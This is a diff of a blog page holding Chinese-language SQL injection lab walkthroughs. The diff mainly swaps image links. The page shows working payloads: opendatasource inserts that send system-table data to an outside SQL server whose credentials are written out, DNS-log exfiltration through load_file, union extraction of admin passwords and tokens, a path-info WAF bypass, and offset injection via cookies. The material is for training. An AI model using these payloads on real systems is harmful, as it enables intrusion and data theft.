 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.tb <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> sysobjects</span><br><span class="line"> <span class="keyword">where</span> xtype=’U’ — q</span><br></pre></td></tr></table></figure>
 
-<p>返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173117458.png" alt="在这里插入图片描述"></p>
-<p>3、查看 tb表 是否有数据<br><img src="https://img-blog.csdnimg.cn/20210410173127946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>4、创建存放admin表中字段的表 col<br><img src="https://img-blog.csdnimg.cn/20210410173134513.png" alt="在这里插入图片描述"></p>
+<p>返回正常<br><img src="/Image%5CSQL-9-Chinese%5C2024101713005086.png" alt="在这里插入图片描述"></p>
+<p>3、查看 tb表 是否有数据<br><img src="/Image%5CSQL-9-Chinese%5C2024101713005089.png" alt="在这里插入图片描述"></p>
+<p>4、创建存放admin表中字段的表 col<br><img src="/Image%5CSQL-9-Chinese%5C2024101713005092.png" alt="在这里插入图片描述"></p>
 <p>5、构造payload，查admin表的字段</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.col <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> syscolumns</span><br><span class="line"> <span class="keyword">where</span> id=<span class="number">1977058079</span> — q</span><br></pre></td></tr></table></figure>
 
-<p>页面返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173159649.png" alt="在这里插入图片描述"></p>
-<p>6、查看数据库中col表<br><img src="https://img-blog.csdnimg.cn/20210410173211354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>7、得到admin表中字段：id、username、passwd、token<br>创建res表 用于存放admin表中字段信息<br><img src="https://img-blog.csdnimg.cn/20210410173219978.png" alt="在这里插入图片描述"></p>
+<p>页面返回正常<br><img src="/Image%5CSQL-9-Chinese%5C20241017130050103.png" alt="在这里插入图片描述"></p>
+<p>6、查看数据库中col表<br><img src="/Image%5CSQL-9-Chinese%5C20241017130051106.png" alt="在这里插入图片描述"></p>
+<p>7、得到admin表中字段：id、username、passwd、token<br>创建res表 用于存放admin表中字段信息<br><img src="/Image%5CSQL-9-Chinese%5C20241017130051110.png" alt="在这里插入图片描述"></p>
 <p>8、页面返回正常</p>
-<p><img src="https://img-blog.csdnimg.cn/20210410173226604.png" alt="在这里插入图片描述"></p>
-<p>9、查看res表，得到flag<br><img src="https://img-blog.csdnimg.cn/20210410173237828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-9-Chinese%5C20241017130051114.png" alt="在这里插入图片描述"></p>
+<p>9、查看res表，得到flag<br><img src="/Image%5CSQL-9-Chinese%5C20241017130051117.png" alt="在这里插入图片描述"></p>
 <h2 id="使用显错注入"><a href="#使用显错注入" class="headerlink" title="使用显错注入"></a>使用显错注入</h2><h2 id="显错注入基础"><a href="#显错注入基础" class="headerlink" title="显错注入基础"></a>显错注入基础</h2><ul>
 <li>union 联合查询 去重</li>
 <li>union all 不去重 显示全部数据</li>
@@ -1262,20 +1262,20 @@
 <p>select 字段名 from 表名</p>
 </li>
 </ul>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410173834636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>2、1后加\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410173845696.png" alt="在这里插入图片描述"></p>
-<p>3、构造闭合 ‘ — q<br><img src="https://img-blog.csdnimg.cn/20210410173857498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>4、使用order by 探测字段数<br>order by 4 报错<br><img src="https://img-blog.csdnimg.cn/2021041017390864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>order by 3 正常<br><img src="https://img-blog.csdnimg.cn/20210410173926890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="/Image%5CSQL-9-Chinese%5C20241017130052145.png" alt="在这里插入图片描述"></p>
+<p>2、1后加\进行探测<br><img src="/Image%5CSQL-9-Chinese%5C20241017130052148.png" alt="在这里插入图片描述"></p>
+<p>3、构造闭合 ‘ — q<br><img src="/Image%5CSQL-9-Chinese%5C20241017130052151.png" alt="在这里插入图片描述"></p>
+<p>4、使用order by 探测字段数<br>order by 4 报错<br><img src="/Image%5CSQL-9-Chinese%5C20241017130053155.png" alt="在这里插入图片描述"></p>
+<p>order by 3 正常<br><img src="/Image%5CSQL-9-Chinese%5C20241017130053158.png" alt="在这里插入图片描述"></p>
 <p>字段数为3</p>
-<p>5、使用联合查询<br><img src="https://img-blog.csdnimg.cn/20210410173938101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>加union all 试一试<br><img src="https://img-blog.csdnimg.cn/20210410173949632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>6、猜测表名news<br><img src="https://img-blog.csdnimg.cn/20210410173959934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>7、会不会是 数据类型不对呢，1，2，3全部改为null<br><img src="https://img-blog.csdnimg.cn/20210410174119363.png" alt="在这里插入图片描述"></p>
-<p>8、猜测第一个null是int型，第二ge和第三个是字符型<br><img src="https://img-blog.csdnimg.cn/20210410174100149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>9、通过sysobjects表的id、xtype和name 探测用户创建的表名<br>payload：<br>‘ union all select id,name,’b’ from sysobjects where xtype&#x3D;’U’— q<br><img src="https://img-blog.csdnimg.cn/2021041017404595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>10、探测admin表中的字段，通过syscolumns表中的id和name<br>payload：<br>‘ union all select id,name,’b’ from syscolumns where id&#x3D;1977058079 — q<br><img src="https://img-blog.csdnimg.cn/20210410174145966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>11、查看passwd和token字段数据<br>payload：<br>‘ union all select id,passwd,token from admin — q<br><img src="https://img-blog.csdnimg.cn/20210410174157895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>5、使用联合查询<br><img src="/Image%5CSQL-9-Chinese%5C20241017130053163.png" alt="在这里插入图片描述"></p>
+<p>加union all 试一试<br><img src="/Image%5CSQL-9-Chinese%5C20241017130053166.png" alt="在这里插入图片描述"></p>
+<p>6、猜测表名news<br><img src="/Image%5CSQL-9-Chinese%5C20241017130054169.png" alt="在这里插入图片描述"></p>
+<p>7、会不会是 数据类型不对呢，1，2，3全部改为null<br><img src="/Image%5CSQL-9-Chinese%5C20241017130054172.png" alt="在这里插入图片描述"></p>
+<p>8、猜测第一个null是int型，第二ge和第三个是字符型<br><img src="/Image%5CSQL-9-Chinese%5C20241017130054175.png" alt="在这里插入图片描述"></p>
+<p>9、通过sysobjects表的id、xtype和name 探测用户创建的表名<br>payload：<br>‘ union all select id,name,’b’ from sysobjects where xtype&#x3D;’U’— q<br><img src="/Image%5CSQL-9-Chinese%5C20241017130055180.png" alt="在这里插入图片描述"></p>
+<p>10、探测admin表中的字段，通过syscolumns表中的id和name<br>payload：<br>‘ union all select id,name,’b’ from syscolumns where id&#x3D;1977058079 — q<br><img src="/Image%5CSQL-9-Chinese%5C20241017130055185.png" alt="在这里插入图片描述"></p>
+<p>11、查看passwd和token字段数据<br>payload：<br>‘ union all select id,passwd,token from admin — q<br><img src="/Image%5CSQL-9-Chinese%5C20241017130055190.png" alt="在这里插入图片描述"></p>
 <p>12、得到flag，通过</p>
 
       
@@ -1381,35 +1381,35 @@
 <p>index.php&#x2F;1.txt?id&#x3D;1</p>
 <p>当1.txt不存在时，就会检测上一级 文件是否存在</p>
 <p>如果上一级文件存在，就会把id&#x3D;1传参给index.php</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，看到源码，可以使用id进行传值<br><img src="https://img-blog.csdnimg.cn/2021041017193491.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021041017192584.png" alt="在这里插入图片描述"></p>
-<p>2、使用?id&#x3D;1 and 1&#x3D;1 有WAF<br><img src="https://img-blog.csdnimg.cn/20210410172008442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，看到源码，可以使用id进行传值<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C2024101713002879.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-DNSLog3-Chinese%5C2024101713002980.png" alt="在这里插入图片描述"></p>
+<p>2、使用?id&#x3D;1 and 1&#x3D;1 有WAF<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C2024101713002983.png" alt="在这里插入图片描述"></p>
 <p>3、使用&#x2F;1.txt?id&#x3D;1 进行绕过 并分别输入 and 1&#x3D;1 和 and 1&#x3D;2 进行探测<br>绕WAF：<br>1、绕规则<br>2、绕检测<br>3、白名单</p>
-<p>and 1&#x3D;1<br><img src="https://img-blog.csdnimg.cn/20210410172028297.png" alt="在这里插入图片描述"></p>
-<p>and 1&#x3D;2<br><img src="https://img-blog.csdnimg.cn/20210410172035940.png" alt="在这里插入图片描述"></p>
+<p>and 1&#x3D;1<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C2024101713002992.png" alt="在这里插入图片描述"></p>
+<p>and 1&#x3D;2<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C2024101713003095.png" alt="在这里插入图片描述"></p>
 <p>4、使用DNS注入，用load_file()函数构造payload 爆出数据名名：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx<span class="regexp">/index3.php/</span><span class="number">1</span>.txt?id=<span class="number">1</span> and (select load_file(concat(‘<span class="regexp">//</span>‘,database(),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410172054851.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130030103.png" alt="在这里插入图片描述"></p>
 <p>5、构造payload 爆出当前数据库下的表名：</p>
 <p>爆出第一个表名 admin</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> </span><br><span class="line">information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
 
-<p>注意：.h3uk2s.dnslog.cn&#x2F;abc 中的abc存不存在 不重要<br><img src="https://img-blog.csdnimg.cn/20210410172118391.png" alt="在这里插入图片描述"></p>
-<p>爆出第二条表名 news<br><img src="https://img-blog.csdnimg.cn/2021041017212945.png" alt="在这里插入图片描述"></p>
-<p>爆出第三条表名时 无反应<br><img src="https://img-blog.csdnimg.cn/20210410172139661.png" alt="在这里插入图片描述"></p>
+<p>注意：.h3uk2s.dnslog.cn&#x2F;abc 中的abc存不存在 不重要<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130030115.png" alt="在这里插入图片描述"></p>
+<p>爆出第二条表名 news<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130030118.png" alt="在这里插入图片描述"></p>
+<p>爆出第三条表名时 无反应<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130031121.png" alt="在这里插入图片描述"></p>
 <p>故判断 只有两张表 admin news</p>
 <p>6、构造payload爆出admin表下的字段名<br>爆出第一个字段名id</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,</span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> <span class="built_in">table_name</span>=’<span class="keyword">admin</span>’ </span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410172211971.png" alt="在这里插入图片描述"></p>
-<p>爆出第二个字段名 limit 1,1 username<br><img src="https://img-blog.csdnimg.cn/20210410172222651.png" alt="在这里插入图片描述"></p>
-<p>爆出第三个字段名limit 2,1 password<br><img src="https://img-blog.csdnimg.cn/20210410172233359.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130031134.png" alt="在这里插入图片描述"></p>
+<p>爆出第二个字段名 limit 1,1 username<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130031137.png" alt="在这里插入图片描述"></p>
+<p>爆出第三个字段名limit 2,1 password<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130032140.png" alt="在这里插入图片描述"></p>
 <p>爆出第四个字段名时 limit 3,1 无反应<br>故判断 admin表下总共3个字段 id、username、password</p>
 <p>7、flag可能在password字段中，所以构造payload 爆出password字段中的信息<br>爆出第一条信息</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index3.php/<span class="number">1.</span>txt?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(‘//‘,</span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),’.h3uk2s.dnslog.cn/abc’)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410172254527.png" alt="在这里插入图片描述"></p>
-<p>使用limit 1,1 没有反应<br><img src="https://img-blog.csdnimg.cn/20210410172318442.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130032153.png" alt="在这里插入图片描述"></p>
+<p>使用limit 1,1 没有反应<br><img src="/Image%5CSQL-DNSLog3-Chinese%5C20241017130032156.png" alt="在这里插入图片描述"></p>
 <p>故判断只有一条信息<br>8、得到flag，通关</p>
 
       
@@ -1496,18 +1496,18 @@
 <p>猜测表名 and exists(select * from 表名)</p>
 <p>开始偏移注入</p>
 <p>注意：<br>select username,password from admin<br>&#x3D;&gt;select * from admin<br>&#x3D;&gt;select admin.* from admin<br>库名.表名.字段名</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察ID进行了传递参数，探测id是否可以注入<br><img src="https://img-blog.csdnimg.cn/20210410170853717.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410170858194.png" alt="在这里插入图片描述"></p>
-<p>2、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410170945896.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410170959783.png" alt="在这里插入图片描述"></p>
-<p>3、得出字段数为26，使用union查询，弹出警告<br><img src="https://img-blog.csdnimg.cn/20210410171014337.png" alt="在这里插入图片描述"></p>
-<p>4、观察cookie可以进行传参<br><img src="https://img-blog.csdnimg.cn/20210410171033250.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210410171021982.png" alt="在这里插入图片描述"></p>
-<p>5、使用联合查询，注意cookie的传入的值需要进行URL编码<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26<br>报错<br><img src="https://img-blog.csdnimg.cn/20210410171047318.png" alt="在这里插入图片描述"></p>
-<p>6、猜测数据库可能不是MySQL，.asp网站 使用accesss数据库居多，<br>故猜测表名可能是admin，使用 105 and exists(select * from admin)<br><img src="https://img-blog.csdnimg.cn/2021041017112533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>7、得到表名admin，使用联合查询 探测回显点<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171154851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>8、26个字段才回显三个？ 重新构造payload 打开网页源码<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,9726 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171218372.png" alt="在这里插入图片描述"></p>
-<p>9、25也为回显点，使用 admin.* from admin 猜测 admin表的字段数<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,admin.*from admin<br><img src="https://img-blog.csdnimg.cn/20210410171251653.png" alt="在这里插入图片描述"></p>
-<p>10、依次减去字段数，直到9710，得到数据 width &#x3D; 450，得到admin表倒数第二个字段<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,admin.* from admin<br><img src="https://img-blog.csdnimg.cn/20210410171302980.png" alt="在这里插入图片描述"></p>
-<p>11、把admin.* 前移一个位置<br>-1 union select 971,972,973,974,975,976,977,978,979,admin.*,9710 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171311977.png" alt="在这里插入图片描述"><br>12、得到FLAG，通关</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察ID进行了传递参数，探测id是否可以注入<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004637.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-8-Chinese%5C2024101713004638.png" alt="在这里插入图片描述"></p>
+<p>2、使用order by 判断字段数<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004641.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-8-Chinese%5C2024101713004742.png" alt="在这里插入图片描述"></p>
+<p>3、得出字段数为26，使用union查询，弹出警告<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004745.png" alt="在这里插入图片描述"></p>
+<p>4、观察cookie可以进行传参<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004748.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-8-Chinese%5C2024101713004750.png" alt="在这里插入图片描述"></p>
+<p>5、使用联合查询，注意cookie的传入的值需要进行URL编码<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26<br>报错<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004855.png" alt="在这里插入图片描述"></p>
+<p>6、猜测数据库可能不是MySQL，.asp网站 使用accesss数据库居多，<br>故猜测表名可能是admin，使用 105 and exists(select * from admin)<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004859.png" alt="在这里插入图片描述"></p>
+<p>7、得到表名admin，使用联合查询 探测回显点<br>-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004863.png" alt="在这里插入图片描述"></p>
+<p>8、26个字段才回显三个？ 重新构造payload 打开网页源码<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,9726 from admin<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004967.png" alt="在这里插入图片描述"></p>
+<p>9、25也为回显点，使用 admin.* from admin 猜测 admin表的字段数<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,admin.*from admin<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004971.png" alt="在这里插入图片描述"></p>
+<p>10、依次减去字段数，直到9710，得到数据 width &#x3D; 450，得到admin表倒数第二个字段<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,admin.* from admin<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004975.png" alt="在这里插入图片描述"></p>
+<p>11、把admin.* 前移一个位置<br>-1 union select 971,972,973,974,975,976,977,978,979,admin.*,9710 from admin<br><img src="/Image%5CSQL-8-Chinese%5C2024101713004979.png" alt="在这里插入图片描述"><br>12、得到FLAG，通关</p>
 
       
     </div>
@@ -1539,7 +1539,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
